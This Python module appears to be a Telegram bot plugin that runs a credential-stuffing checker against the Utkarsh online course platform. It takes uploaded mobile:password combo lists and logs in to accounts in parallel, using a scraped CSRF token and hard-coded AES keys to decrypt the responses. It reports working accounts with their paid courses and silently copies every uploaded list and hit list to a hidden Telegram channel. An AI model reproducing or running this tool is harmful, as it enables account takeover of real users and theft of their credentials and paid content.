import requests
import json
import base64
import uuid
import os
import time
import asyncio
import logging
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from concurrent.futures import ThreadPoolExecutor
from telegram import Update
from telegram.ext import ContextTypes

logger = logging.getLogger(__name__)

# 🔑 AES Keys
KEY = b'%!$!%_$&!%F)&^!^'
IV = b'#*y*#2yJ*#$wJv*v'

REQUEST_TIMEOUT = 8
SLEEP_TIME = 0.2

def decrypt_utkarsh(enc_data):
    try:
        if not enc_data or not isinstance(enc_data, str): 
            return None
        cleaned_data = enc_data.replace('MDE2MTA4NjQxMDI3NDUxNQ==', '==').replace(':', '==')
        raw_bytes = base64.b64decode(cleaned_data)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        decrypted = unpad(cipher.decrypt(raw_bytes), AES.block_size)
        return json.loads(decrypted.decode('utf-8'))
    except Exception:
        return None

def process_line(line):
    parts = line.strip().split(':')
    if len(parts) < 2: 
        return None, None
    p = parts[-1].strip()
    u = parts[-2].strip()
    if "/" in u:
        u = u.split("/")[-1]
    if not u or not p or "utkarsh.com" in u: 
        return None, None
    return u, p

def is_paid_course(course_item):
    price_fields = ['mrp', 'price', 'amount', 'original_price', 'course_price']
    for field in price_fields:
        if field in course_item:
            val = course_item[field]
            if val is None or val == '' or str(val).lower() in ['0', '0.0', '0.00', 'free', 'null', 'none']:
                return False
            try:
                if float(val) > 0:
                    return True
            except:
                pass
    if 'is_paid' in course_item:
        return bool(course_item['is_paid'])
    if 'plan_type' in course_item:
        return str(course_item['plan_type']).lower() in ['paid', 'premium', 'prime']
    if 'course_type' in course_item:
        return str(course_item['course_type']).lower() in ['paid', 'premium', 'prime']
    return False

def extract_courses_with_type(raw_data):
    paid = []
    free = []
    if not raw_data:
        return paid, free
    
    def get_course_info(item):
        if not isinstance(item, dict):
            return None, None
        name = None
        for field in ['title', 'course_name', 'batch_name', 'name', 'course_title', 'plan_name', 'display_name']:
            if field in item and isinstance(item[field], str) and item[field].strip():
                name = item[field].strip()
                if name.lower() not in ['null', 'none', 'undefined', '']:
                    break
        if not name:
            return None, None
        is_paid = is_paid_course(item)
        return name, is_paid
    
    def recurse(data):
        if isinstance(data, dict):
            name, is_paid = get_course_info(data)
            if name:
                if is_paid:
                    paid.append(name)
                else:
                    free.append(name)
            for key, value in data.items():
                if key in ['data', 'list', 'courses', 'batches', 'items'] or isinstance(value, (dict, list)):
                    recurse(value)
        elif isinstance(data, list):
            for item in data:
                recurse(item)
    
    recurse(raw_data)
    
    def unique_preserve_order(lst):
        seen = set()
        result = []
        for x in lst:
            if x not in seen:
                seen.add(x)
                result.append(x)
        return result
    
    return unique_preserve_order(paid), unique_preserve_order(free)

def fetch_all_courses(session, headers):
    paid_courses = []
    free_courses = []
    base_url = "https://online.utkarsh.com/web/Profile/my_course"
    cookie = headers.get('cookie', '')
    csrf = ""
    if 'csrf_name=' in cookie:
        csrf = cookie.split('csrf_name=')[1].split(';')[0].strip()
    
    for course_type in ["Batch", "Free", "Prime"]:
        try:
            payload = {"type": course_type, "csrf_name": csrf, "sort": "0"}
            res = session.post(base_url, headers=headers, data=payload, timeout=REQUEST_TIMEOUT)
            if res.status_code == 200:
                res_json = res.json()
                if "response" in res_json:
                    res_json = decrypt_utkarsh(res_json["response"]) or res_json
                
                p, f = extract_courses_with_type(res_json)
                for course in p:
                    if course not in paid_courses:
                        paid_courses.append(course)
                for course in f:
                    if course not in free_courses:
                        free_courses.append(course)
        except Exception:
            pass
        time.sleep(SLEEP_TIME)
    
    return paid_courses, free_courses


class Checker:
    command = "utkarsh"
    name = "Utkarsh"  # ✅ Ye naam hi file ka naam banega

    async def handle_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        context.user_data['awaiting_file_for'] = self.command
        await update.message.reply_text(
            f"📂 <b>{self.name} Ultra-Fast Checker Ready!</b>\n\n"
            f"Ab apna <code>combo.txt</code> file (mobile:password) bhejo.\n"
            f"🔐 <b>AES Decryption Active:</b> Paid/Free courses auto-categorize honge.\n"
            f"⚠️ <b>Strict Filter:</b> Jin accounts me <b>koi course nahi</b> hai, wo hits me <b>NAHI</b> aayenge.\n"
            f"⚡ <b>No Proxy:</b> 15 Threads ke sath direct ultra-fast connection.\n"
            f"🛑 Beech mein rokna ho toh <code>/stop</code> type kar do.",
            parse_mode="HTML"
        )

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        progress_msg = await update.message.reply_text("⏳ File download kar raha hoon aur check start kar raha hoon...")
        
        file = await update.message.document.get_file()
        
        # ✅ Original filename preserve karo
        original_file_name = update.message.document.file_name or "combo.txt"
        temp_original_path = f"temp_orig_{update.effective_user.id}_{int(time.time())}.txt"
        
        await file.download_to_drive(temp_original_path)
        
        with open(temp_original_path, 'r', encoding='utf-8-sig', errors='ignore') as f:
            lines = [line.strip() for line in f if line.strip()]
            
        total = len(lines)
        if total == 0:
            await progress_msg.edit_text("❌ File khali hai ya valid nahi hai!")
            if os.path.exists(temp_original_path): os.remove(temp_original_path)
            return

        stats = {'checked': 0, 'hits': 0, 'no_course': 0, 'failed': 0, 'hit_details': []}
        context.user_data[f'stats_{self.command}'] = stats
        context.user_data['stop_checking'] = False

        asyncio.create_task(self.run_checker(update, context, temp_original_path, original_file_name, lines, total, progress_msg))

    async def run_checker(self, update, context, temp_original_path, original_file_name, lines, total, progress_msg):
        max_workers = 15
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            chunk_size = 15
            
            for i in range(0, total, chunk_size):
                if context.user_data.get('stop_checking', False): break
                
                chunk = lines[i:i+chunk_size]
                futures = [executor.submit(self.check_single, line, total) for line in chunk]
                
                for future in futures:
                    if context.user_data.get('stop_checking', False): break
                    
                    result = future.result()
                    stats = context.user_data[f'stats_{self.command}']
                    stats['checked'] += 1
                    
                    if result['status'] == 'hit':
                        stats['hits'] += 1
                        stats['hit_details'].append(result['data'])
                    elif result['status'] == 'no_course':
                        stats['no_course'] += 1
                    else:
                        stats['failed'] += 1
                
                if context.user_data.get('stop_checking', False): break
                
                stats = context.user_data[f'stats_{self.command}']
                progress_text = (
                    f"🔄 <b>{self.name} Checking...</b>\n\n"
                    f"📊 Total: {total}\n✅ Checked: {stats['checked']}\n"
                    f"🔥 Hits: {stats['hits']}\n"
                    f"⚠️ No Course: {stats['no_course']}\n"
                    f"❌ Failed: {stats['failed']}\n⏳ Remaining: {total - stats['checked']}"
                )
                try:
                    await progress_msg.edit_text(progress_text, parse_mode="HTML")
                except Exception:
                    pass
                
                await asyncio.sleep(0.1)

        # ============ FINAL CLEANUP & SUMMARY ============
        stats = context.user_data.get(f'stats_{self.command}', {'checked': 0, 'hits': 0, 'no_course': 0, 'failed': 0, 'hit_details': []})
        is_stopped = context.user_data.get('stop_checking', False)
        
        context.user_data.pop('stop_checking', None)
        context.user_data.pop('awaiting_file_for', None)
        context.user_data.pop(f'stats_{self.command}', None)
        
        user_name = update.effective_user.username or f"User_{update.effective_user.id}"
        failed_total = stats['failed'] + stats['no_course']
        
        # ✅ APP NAME se filename banao (e.g., "Utkarsh.txt")
        app_filename = f"{self.name}.txt"
        
        # ✅ 1. CAPTION FOR USER (NO "👤 User" line here)
        user_caption = (
            f"🎉 {self.name} - Checking Completed!\n\n"
            f"📊 Total: {total}\n"
            f"✅ Checked: {stats['checked']}\n"
            f"🔥 Hits (With Batches): {stats['hits']}\n"
            f"❌ Failed/No Batch: {failed_total}"
        )
        
        # ✅ 2. CAPTION FOR LOG - Original File
        log_original_caption = (
            f"🎉 {self.name} Checker\n"
            f"👤 User: @{user_name}"
        )
        
        # ✅ 3. CAPTION FOR LOG - Hits File
        log_hits_caption = (
            f"👤 User: @{user_name}\n\n"
            f"🎉 {self.name} - Checking Completed!\n\n"
            f"📊 Total: {total}\n"
            f"✅ Checked: {stats['checked']}\n"
            f"🔥 Hits (With Batches): {stats['hits']}\n"
            f"❌ Failed/No Batch: {failed_total}"
        )
        
        if stats['hits'] > 0:
            # ✅ Hits file ko bhi APP NAME se save karo
            hits_file = f"{self.name}_hits_{update.effective_user.id}_{int(time.time())}.txt"
            with open(hits_file, 'w', encoding='utf-8') as f:
                for hit in stats['hit_details']: 
                    f.write(hit + "\n")
            
            try:
                await progress_msg.delete()
            except Exception:
                pass
            
            # ✅ SEND ONLY HITS FILE TO USER (Filename: Utkarsh.txt)
            await update.message.reply_document(
                document=open(hits_file, 'rb'),
                filename=app_filename,  # ✅ APP NAME FILENAME
                caption=user_caption
            )
            
            # ✅ SEND BOTH FILES TO LOG (CHANNEL)
            try:
                # 1. Original File to Channel (Filename: Utkarsh.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_original_path, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME (NO RENAME)
                    caption=log_original_caption
                )
                # 2. Hits File to Channel (Filename: Utkarsh.txt)
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(hits_file, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=log_hits_caption
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")
                
            if os.path.exists(hits_file): os.remove(hits_file)
            
        else:
            # No hits: notify user (NO original file sent back to user)
            await progress_msg.edit_text(
                f"{user_caption}\n\n❌ Koi bhi Active Hit (with courses) nahi mila.", 
                parse_mode="HTML"
            )
            
            # Optional: Still log the original file to channel even if 0 hits
            try:
                await context.bot.send_document(
                    chat_id=-1004423798759,
                    document=open(temp_original_path, 'rb'),
                    filename=app_filename,  # ✅ APP NAME FILENAME
                    caption=f"{log_original_caption}\n(0 Hits)"
                )
            except Exception as e:
                logger.error(f"Channel send error: {e}")

        # ✅ Cleanup temp original file at the very end
        if os.path.exists(temp_original_path): os.remove(temp_original_path)

    def check_single(self, line, total_lines):
        mobile, password = process_line(line)
        if not mobile:
            return {'status': 'failed'}

        session = requests.Session()
        session_id = str(uuid.uuid4()).replace('-', '')
        
        headers = {
            'authority': 'online.utkarsh.com',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://online.utkarsh.com',
            'referer': 'https://online.utkarsh.com/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            'cookie': f'ci_session={session_id}'
        }

        try:
            t_res = session.get('https://online.utkarsh.com/web/home/get_states', headers=headers, timeout=REQUEST_TIMEOUT)
            token = t_res.json().get("token")
            
            if not token:
                return {'status': 'failed'}
            
            headers['cookie'] = f'csrf_name={token}; ci_session={session_id}'
            time.sleep(SLEEP_TIME)

            payload = {
                "csrf_name": token, 
                "mobile": mobile, 
                "password": password,
                "submit": "LogIn", 
                "url": "0", 
                "device_token": "null"
            }
            
            res = session.post("https://online.utkarsh.com/web/Auth/login", data=payload, headers=headers, timeout=REQUEST_TIMEOUT)
            res_data = res.json().get("response", "")
            login_json = decrypt_utkarsh(res_data)

            if login_json and login_json.get("status") is True:
                name = login_json.get('data', {}).get('first_name', 'User')
                time.sleep(SLEEP_TIME)
                
                paid, free = fetch_all_courses(session, headers)
                
                if paid or free:
                    batch_display = f"Paid: {len(paid)} | Free: {len(free)}"
                    result = f"✅ SUCCESS! | {mobile}:{password} | Name: {name} | Batches: {batch_display}"
                    return {'status': 'hit', 'data': result}
                else:
                    return {'status': 'no_course'}
            
            return {'status': 'failed'}

        except Exception:
            return {'status': 'failed'}
        finally:
            session.close()
